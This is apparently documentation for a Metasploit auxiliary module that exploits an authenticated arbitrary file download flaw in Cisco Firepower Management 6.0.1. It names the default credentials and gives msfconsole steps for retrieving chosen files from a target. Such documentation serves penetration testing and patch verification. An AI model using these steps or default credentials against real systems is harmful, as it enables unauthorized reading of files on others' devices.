## Vulnerable Application

This module exploits a vulnerability found in Cisco Firepower Management console. A logged in
user can abuse the report viewing feature to download an arbitrary file. Authentication is
required to exploit this vulnerability.

This module was written specifically against Cisco Firepower Management 6.0.1 (build 1213) during
development. To test, you may download the virtual appliance here:

https://software.cisco.com/download/release.html?mdfid=286259687&softwareid=286271056&release=6.0.1&flowid=54052

## Verification Steps

To use this module, first you need to know an username and password. The management console uses
admin:Admin123 by default:

1. Start msfconsole
2. ```use auxiliary/scanner/http/cisco_firepower_download```
3. ```set USERNAME [user]```
4. ```set PASSWORD [pass]```
5. ```set RHOSTS [IP]```
6. ```set FILEPATH [file to download]```
7. ```run```

If the file is found, it will be saved in the loot directory. If not found, the module should
print an error indicating so.

## Scenarios

![cisco_download_demo](https://cloud.githubusercontent.com/assets/1170914/21782825/78ada38e-d67a-11e6-9b7b-c7b8e2956fba.gif)
